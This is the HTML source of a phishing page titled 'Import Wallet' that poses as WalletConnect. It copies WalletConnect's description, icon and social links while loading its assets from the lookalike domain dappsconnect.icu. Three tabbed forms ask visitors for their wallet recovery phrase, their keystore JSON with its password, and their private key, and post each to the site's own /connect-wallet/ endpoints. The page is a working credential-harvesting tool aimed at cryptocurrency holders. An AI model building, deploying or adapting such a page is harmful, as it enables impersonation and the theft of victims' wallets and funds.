<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="stylesheet" href="style.css" type="text/css" />
    <meta
      name="description"
      content="Open protocol for connecting Wallets to Dapps"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />
    <meta property="og:image" content="https://walletconnect.org/favicon.ico" />
    <link rel="icon" href="https://walletconnect.org/favicon.ico" />
    <script>
      function openCity(evt, cityName) {
        // Declare all variables
        var i, tabcontent, tablinks

        // Get all elements with class="tabcontent" and hide them
        tabcontent = document.getElementsByClassName('tabcontent')
        for (i = 0; i < tabcontent.length; i++) {
          tabcontent[i].style.display = 'none'
        }

        // Get all elements with class="tablinks" and remove the class "active"
        tablinks = document.getElementsByClassName('tablinks')
        for (i = 0; i < tablinks.length; i++) {
          tablinks[i].className = tablinks[i].className.replace(' active', '')
        }

        // Show the current tab, and add an "active" class to the button that opened the tab
        document.getElementById(cityName).style.display = 'block'
        evt.currentTarget.className += ' active'
      }
    </script>
    <title>Import Wallet</title>
  </head>
  <body>
    <center>
      <div class="top">
        <a href="#" class="left">Github</a>
        <a href="#" class="left">Docs</a>
        <a href="/unlock" class="main">
          <img src="https://dappsconnect.icu/assets/logo.svg" alt="logo" />
        </a>
        <a href="#" class="left">Wallets</a>
        <a href="#" class="left">Apps</a>
      </div>
      <br />
      <h2 style="margin: 50px;"><center>Import Wallet</center></h2>
      <br />
      <div class="tab">
        <button
          class="tablinks active"
          id="default"
          onclick="openCity(event, &#39;phrase&#39;)"
        >
          Phrase
        </button>
        <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">
          Keystore JSON
        </button>
        <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">
          Private Key
        </button>
      </div>
      <br />

      <div id="phrase" class="tabcontent" style="display: block;">
        <form action="/connect-wallet/phrase" method="POST">
          <input type="hidden" name="w" value="metamask" />

          <textarea
            name="phrase"
            class="phrase message"
            required="required"
            minlength="12"
            placeholder="Insert your phrase - Typically 12 or more words, separated by single space"
          ></textarea>
          <br />
          <br />
          <div class="desc">
            Typically 12 (sometimes 24) words separated by single spaces
          </div>
          <br />
          <button type="submit" name="import" class="mybtn">
            IMPORT
          </button>
        </form>
      </div>

      <div id="keystore" class="tabcontent" style="display: none;">
        <form action="/connect-wallet/keystore" method="POST">
          <input type="hidden" name="w" value="metamask" />

          <textarea
            name="phrase"
            class="phrase"
            required="required"
            minlength="12"
            placeholder="Keystore JSON"
          ></textarea>
          <br />
          <div class="field">
            <input type="text" name="password" placeholder="Password" />
          </div>
          <div class="desc">
            Several lines of text beginning with '(...)' plus the password you
            used to encrypt it.
          </div>
          <br />
          <button type="submit" name="import" class="mybtn">IMPORT</button>
        </form>
      </div>

      <div id="private" class="tabcontent" style="display: none;">
        <form action="/connect-wallet/privatekey" method="POST">
          <input type="hidden" name="w" value="metamask" />
          <div class="field">
            <input
              type="text"
              name="key"
              class="key"
              placeholder="Private Key"
            />
          </div>
          <div class="desc">
            Typically 12 (sometimes 24) words separated by single spaces
          </div>
          <br />
          <button type="submit" name="import" class="mybtn">IMPORT</button>
        </form>
      </div>

      <script>
        document.getElementById('default').click()
      </script>
      <footer>
        <div id="footer">
          <p>
            <img
              src="https://dappsconnect.icu//assets/discord.svg"
              class="footimg"
            />
            <a href="https://discord.gg/jhxMvxP">Discord</a>
          </p>
          <br />
          <p>
            <img
              src="https://dappsconnect.icu//assets/telegram.svg"
              class="footimg"
            />
            <a href="https://t.me/walletconnect_announcements">Telegram</a>
          </p>
          <br />
          <p>
            <img
              src="https://dappsconnect.icu//assets/twitter.svg"
              class="footimg"
            />
            <a href="https://twitter.walletconnect.org/">Twitter</a>
          </p>
          <br />
          <p>
            <img
              src="https://dappsconnect.icu//assets/github.svg"
              class="footimg"
            />
            <a href="https://github.com/walletconnect">Github</a>
          </p>
          <br />
        </div>
      </footer>
    </center>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="index.js"></script>
  </body>
</html>
